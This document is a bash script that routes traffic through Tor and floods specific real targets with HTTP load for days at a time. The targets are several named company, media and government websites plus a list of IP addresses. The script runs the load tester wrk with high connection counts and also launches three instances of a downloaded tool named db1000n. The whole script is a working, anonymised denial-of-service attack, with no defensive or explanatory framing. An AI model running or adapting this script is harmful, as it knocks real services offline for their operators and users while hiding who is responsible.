#!/bin/bash


[[ -z $(service tor status | grep "tor is running") ]] && service tor start
sleep 5

NUM0=4
NUM1=$(($NUM0*2))
NUM2=$(($NUM1*4))
DLEN=$((3*3600*24))
URLS=(
  "https://alfagroup.ru" 
  "https://rt.com" 
  "https://thalesgroup.com"
  "https://primeminister.hu"
   "http://193.37.157.24:80/" 
  "https://193.37.157.24:443/"
   "http://193.0.214.42:80/"
  "https://193.0.214.42:443/"
   "http://91.213.144.43:80/"
  "https://91.213.144.43:443/"
   "http://213.109.72.155:80/"
  "https://213.109.72.155:443/"
   "http://46.17.202.70:80/"
  "https://46.17.202.70:443/"
   "http://46.17.202.90:80/"
  "https://46.17.202.90:443/"
   "http://62.76.102.63:80/"
  "https://62.76.102.63:443/"
   "http://46.48.118.29:80/"
  "https://46.48.118.29:443/"
  )

for TURL in ${URLS[*]}
do
  A=$NUM0
  B=$DLEN
  C=$TURL
  
  [[ $TURL == "https://alfagroup.ru" ]] && A=$NUM1
  [[ $TURL == "https://rt.com" ]] && A=$NUM1
  [[ $TURL == "https://thalesgroup.com" ]] && A=$NUM1
  [[ $TURL == "https://primeminister.hu" ]] && A=$NUM1
  
  torsocks wrk -c$NUM2 -t$A -d$B --timeout 5s $C &
done   

torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://rt.com &
torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://thalesgroup.com &
torsocks wrk -c512 -t8 -d1048756 --timeout 5s https://primeminister.hu &

torsocks /root/Downloads/db1000n &  
torsocks /root/Downloads/db1000n &  
torsocks /root/Downloads/db1000n &  
